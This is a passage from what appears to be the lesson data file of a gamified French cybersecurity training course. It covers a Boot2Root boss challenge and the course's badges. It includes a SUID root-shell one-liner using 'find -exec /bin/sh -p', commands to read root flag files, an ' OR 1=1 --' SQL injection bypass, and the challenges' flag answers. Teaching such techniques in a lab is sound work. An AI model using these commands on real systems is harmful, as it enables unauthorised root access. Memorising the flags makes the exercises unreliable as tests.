      "instructions": "Dans le terminal, exécute 'find . -exec /bin/sh -p \\; -quit' pour obtenir le shell root (#), puis lis le fichier secret /root/flag.txt avec 'cat'. Soumets la valeur du drapeau CYBER{...} !",
      "flag": "CYBER{SUID_BINARY_GTFOBINS_EUID_ZERO_ROOT}"
    }
  },
  {
    "id": "m5-l9",
    "unitId": "m5",
    "title": "9. ★ BOSS FIGHT ULTIME : BOOT2ROOT ROOT FLAG ★",
    "icon": "👑",
    "xp": 150,
    "isBoss": true,
    "lessonSlides": [
      {
        "title": "L'Accomplissement Suprême : Boot2Root",
        "bullets": [
          "Tu as commencé tout en bas sans savoir ce qu'était un terminal, une adresse IP, un port, une requête HTTP ou une base de données.",
          "Aujourd'hui, tu as assimilé la chaîne d'attaque complète des plus grands professionnels offensifs :",
          "• Navigation et audit Linux (`pwd`, `ls -la`, `cat`, `grep`, `find`).",
          "• Reconnaissance réseau et inspection de services (`ss`, `curl`, `nmap`).",
          "• Détournement SQL et extraction de base (`WHERE`, `UNION SELECT`).",
          "• Falsification de sessions, failles IDOR, injections XSS et falsification JWT.",
          "• Injection de commande RCE, contournement de filtres `${IFS}` et conquête du Root suprême via SUID.",
          "Pour achever ta formation et décrocher la certification CyberRange PRO, lis le drapeau ultime dans `/root/final_flag.txt` !"
        ]
      }
    ],
    "microCard": {
      "svgVisual": "\n        <svg viewBox=\"0 0 400 120\" class=\"w-full h-full\">\n          <rect x=\"20\" y=\"20\" width=\"360\" height=\"80\" rx=\"10\" fill=\"#030712\" stroke=\"#f59e0b\" stroke-width=\"2\"/>\n          <text x=\"200\" y=\"55\" fill=\"#fbbf24\" font-size=\"14\" font-family=\"monospace\" text-anchor=\"middle\" font-weight=\"bold\">★ ÉPREUVE SUPRÊME BOOT2ROOT CERTIFICATION ★</text>\n          <text x=\"200\" y=\"75\" fill=\"#94a3b8\" font-size=\"11\" font-family=\"monospace\" text-anchor=\"middle\">Lecture du Root Flag Final : /root/final_flag.txt</text>\n        </svg>\n      ",
      "codeSnippet": {
        "language": "bash",
        "lines": [
          {
            "num": 1,
            "text": "# Lecture du drapeau ultime avec les privilèges root acquis :"
          },
          {
            "num": 2,
            "text": "root@cyberlab:~# cat /root/final_flag.txt",
            "isCritical": true,
            "note": "Seul l'utilisateur root UID 0 possède les permissions de lire ce fichier sacré"
          },
          {
            "num": 3,
            "text": "CYBER{M5_BOSS_ROOT_COMPROMISE_FINAL_FLAG}"
          }
        ],
        "prompt": "Clique sur la commande qui lit le fichier final_flag.txt en mode root :"
      },
      "tokenPuzzle": {
        "instruction": "Assemble la commande finale de capture du root flag :",
        "tokens": [
          "cat",
          "/root/final_flag.txt",
          "rm",
          "whoami"
        ],
        "correctOrder": [
          "cat",
          "/root/final_flag.txt"
        ]
      },
      "quickQuiz": {
        "prompt": "Quelle est la définition d'un défi 'Boot2Root' dans les compétitions de cybersécurité (CTF) et pentest ?",
        "options": [
          {
            "text": "Un protocole d'arrêt d'urgence du courant électrique.",
            "isCorrect": false,
            "debrief": "Faux. Boot2Root est une épreuve de hacking."
          },
          {
            "text": "Une mise à jour automatique de la suite bureautique.",
            "isCorrect": false,
            "debrief": "Faux. Aucun lien avec la bureautique."
          },
          {
            "text": "Une simulation réaliste où l'attaquant part d'un accès réseau externe vierge jusqu'à obtenir le contrôle total du compte root sur la machine.",
            "isCorrect": true,
            "debrief": "Exactement ! Boot2Root symbolise la conquête intégrale et sans concession d'un système."
          },
          {
            "text": "Un outil pour nettoyer l'écran de l'ordinateur.",
            "isCorrect": false,
            "debrief": "Faux. C'est le Graal de l'évaluation offensive."
          }
        ]
      }
    },
    "challenge": {
      "type": "terminal",
      "instructions": "Dans le terminal, deviens root avec la technique GTFOBins apprise, puis lis le drapeau ultime dans /root/final_flag.txt avec 'cat'. Soumets la valeur complète CYBER{...} !",
      "flag": "CYBER{M5_BOSS_ROOT_COMPROMISE_FINAL_FLAG}"
    }
  }
];

window.CYBER_BADGES = [
  {
    "id": "badge-linux",
    "title": "Explorateur Linux Débutant",
    "icon": "🐧",
    "desc": "A appris à naviguer, créer et inspecter des fichiers dans un terminal."
  },
  {
    "id": "badge-net",
    "title": "Architecte Réseau Fondamental",
    "icon": "🌐",
    "desc": "Comprend les adresses IP, les numéros de ports, curl et le handshake TCP."
  },
  {
    "id": "badge-sql",
    "title": "Infiltreur de Données SQL",
    "icon": "💉",
    "desc": "Maîtrise les requêtes SELECT et l'injection de contournement ' OR 1=1 --."
  },
  {
    "id": "badge-client",
    "title": "Penta-Testeur Web Client",
    "icon": "⚡",
    "desc": "Capte les failles de contrôle d'accès IDOR et l'injection XSS de cookies."
  },
  {
    "id": "badge-root",
    "title": "Souveraineté Root Suprême",
    "icon": "👑",
    "desc": "A escaladé ses privilèges via un binaire SUID pour conquérir la machine."
  }
];
